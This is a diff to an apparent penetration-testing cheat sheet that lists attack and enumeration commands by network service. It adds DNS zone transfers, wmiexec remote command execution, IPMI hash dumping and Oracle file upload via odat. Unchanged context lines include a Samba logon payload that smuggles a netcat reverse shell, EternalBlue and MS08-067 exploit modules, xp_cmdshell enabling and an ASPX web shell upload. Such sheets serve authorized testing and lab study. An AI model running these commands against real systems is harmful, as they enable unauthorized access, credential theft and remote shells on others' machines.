@@ -82,12 +82,30 @@ $ openssl s_client -connect <IP address>:21 -starttls ftp
 ```
 $ ssh <user>@<IP address>
 $ ssh <user>@<IP address> -p <port>
+$ ssh -i id_rsa <user>@<IP address>
+$ ssh <user>@<IP address> -o PreferredAuthentications=password
+$ ssh-audit.py <IP address>
 ```
 
 - Telnet (port 23)
 
 ```
 $ telnet <IP address>
+```
+
+- SMTP (port 25)
+
+```
+$ telnet <IP address> 25
+```
+
+- DNS (udp/port 53)
+
+```
+$ dig ns <domain.tld> @<nameserver>
+$ dig any <domain.tld> @<nameserver>
+$ dig axfr <domain.tld> @<nameserver>
+$ dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>
 ```
 
 - TFTP (udp/port 69)
@@ -128,6 +146,12 @@ dav:/ put cmdasp.aspx cmdasp.txt
 dav:/ put cmdasp.txt cmdasp.aspx
 ```
 
+- MSRPC (port 135)
+
+```
+$ wmiexec.py <user>:"<password>"@<IP address> "<command>"	
+```
+
 - SMB (port 137/139/445)
 
 ```
@@ -139,13 +163,13 @@ $ smbmap -H <IP address>
 $ smbmap -H <IP address> -u <username> -p <password>
 smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
 $ rpcclient -U "" <IP address>
-$ samrdump.py <IP address>		
+$ samrdump.py <IP address>	
 msf> use auxiliary/scanner/smb/smb_version
 msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> use exploit/windows/smb/ms08_067_netapi
 msf> use exploit/multi/samba/usermap_script
 $ enum4linux -a <IP address>
-$ enum4linux-ng.py -A <IP address>	
+$ enum4linux-ng.py -A <IP address>
 $ crackmapexec smb <IP address> --shares
 $ crackmapexec smb <IP address> --shares -u '' -p ''
 $ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
@@ -159,6 +183,14 @@ $ snmpwalk -v 2c -c <community string> <IP address>
 $ snmpwalk -v 2c -c public <IP address> 1.3.6.1.2.1.1.5.0
 $ snmpwalk -v 2c -c private <IP address> 1.3.6.1.2.1.1.5.0
 $ onesixtyone -c dict.txt <IP address>
+$ braa <community string>@<IP address>:.1.*
+```
+
+- IPMI (udp/port 623)
+
+```
+msf> use auxiliary(scanner/ipmi/ipmi_version)
+msf> use auxiliary(scanner/ipmi/ipmi_dumphashes)	
 ```
 
 - CUPS (port 631)
@@ -177,6 +209,19 @@ $ rsync --list-only <IP address>::<share>
 $ rsync <IP address>::<share>/<filename> <filename>
 ```
 
+- IMAPS (port 993)
+
+```
+$ curl -k 'imaps://<IP address>' --user <user>:<password>
+$ openssl s_client -connect <IP address>:imaps
+```
+
+- POP3S (port 995)
+
+```
+$ openssl s_client -connect <IP address>:pop3s
+```
+
 - MSSQL (port 1433)
 
 ```
@@ -184,6 +229,14 @@ $ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
 SQL> SELECT is_srvrolemember('sysadmin');
 SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 SQL> EXEC xp_cmdshell "whoami";
+```
+
+- Oracle TNS (port 1521)
+
+```
+$ ./odat.py all -s <IP address>
+$ ./odat.py utlfile -s <IP address> -d <database> -U <user> -P <password> --sysdba --putFile <file path> <output file path>
+$ sqlplus <user>/<password>@<IP address>/<database>	
 ```
 
 - NFS (port 2049)
@@ -211,6 +264,7 @@ MariaDB [(none)]> SELECT * FROM <table name>;
 $ xfreerdp /v:<IP address>
 $ xfreerdp /v:<IP address> /u:Administrator
 $ freerdp /v:<IP address> /cert:ignore /u:Administrator
+$ rdp-sec-check.pl <IP address>
 ```
 
 - PostgreSQL (port 5432)
